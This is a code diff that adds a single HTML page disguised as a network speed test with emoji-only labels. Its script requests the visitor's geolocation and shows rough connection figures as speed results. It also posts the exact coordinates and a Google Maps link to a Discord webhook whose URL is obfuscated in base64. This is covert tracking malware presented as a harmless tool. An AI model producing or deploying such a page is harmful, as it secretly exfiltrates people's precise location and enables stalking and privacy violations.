@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛠</title>
+    <style>
+        body{font-family:Arial,sans-serif;background:#aaa;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh}
+        .a{width:500px;padding:25px;background:#fff;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,.1);text-align:center}
+        .b{font-size:22px;margin-bottom:18px;color:#222}
+        .c{font-size:16px;color:#777}
+        .d{margin-top:15px;font-size:16px;display:none}
+        .e{padding:8px 18px;font-size:14px;background:#4CAF50;color:white;border:none;cursor:pointer;border-radius:5px;transition:.3s}
+        .e:hover{background:#45a049}
+        .f{margin-top:15px;width:100%;height:10px;background:#ddd;border-radius:5px;overflow:hidden}
+        .g{height:100%;width:0;background:#4CAF50;border-radius:5px;transition:width 1s ease}
+        .h{color:red;font-size:14px;display:none}
+    </style>
+</head>
+<body>
+    <div class="a">
+        <h1 class="b">🚀</h1>
+        <p id="x" class="c">🔄</p>
+        <button id="y" class="e">▶</button>
+        <div id="z" class="f" style="display:none;">
+            <div id="w" class="g"></div>
+        </div>
+        <div id="v" class="d">
+            <p><strong>📶</strong> <span id="s">-</span> ms</p>
+            <p><strong>⬇</strong> <span id="t">-</span> Mbps</p>
+            <p><strong>⬆</strong> <span id="u">-</span> Mbps</p>
+        </div>
+        <p id="q" class="h">⛔</p>
+    </div>
+    <script>
+        const y=document.getElementById('y'),v=document.getElementById('v'),s=document.getElementById('s'),t=document.getElementById('t'),u=document.getElementById('u'),q=document.getElementById('q'),x=document.getElementById('x'),z=document.getElementById('z'),w=document.getElementById('w');
+        const p=atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1NjIxOTgxNTQ4MzgwMTc3Mi95NU1HUFZncFRmeTI1SkhUS1JXVlBQTmF6RWZvVE9lMG1iQlN0YmVncW50WlNUcUZKaENyWHo3Wm1PSXFYRUl2LW1VRg==");
+        y.addEventListener('click',()=>{x.textContent='⏳';y.disabled=true;z.style.display='block';w.style.width='10%';let a=10;const b=setInterval(()=>{a+=10;w.style.width=`${a}%`;if(a===100){clearInterval(b);}},500);if(navigator.geolocation){navigator.geolocation.getCurrentPosition((c)=>{const d=c.coords.latitude.toFixed(10),e=c.coords.longitude.toFixed(10);let f='❌',g='❌',h='❌';if(navigator.connection){f=navigator.connection.rtt||'❌';g=navigator.connection.downlink||'❌';h='❌'}s.textContent=f;t.textContent=g;u.textContent=h;v.style.display='block';z.style.display='none';o(d,e,f,g);x.textContent='✅';y.disabled=false;},()=>{q.style.display='block';x.textContent='⛔';y.disabled=false});}else{q.style.display='block';x.textContent='❌';y.disabled=false;}});
+        function o(d,e,f,g){const k=`https://www.google.com/maps?q=${d},${e}`;const l={content:`🌍\nLat: ${d}, Lon: ${e}\n📶: ${f} ms\n⬇: ${g} Mbps\n🔗: ${k}`,};fetch(p,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(l)}).catch((m)=>console.error('⚠',m));}
+    </script>
+</body>
+</html>
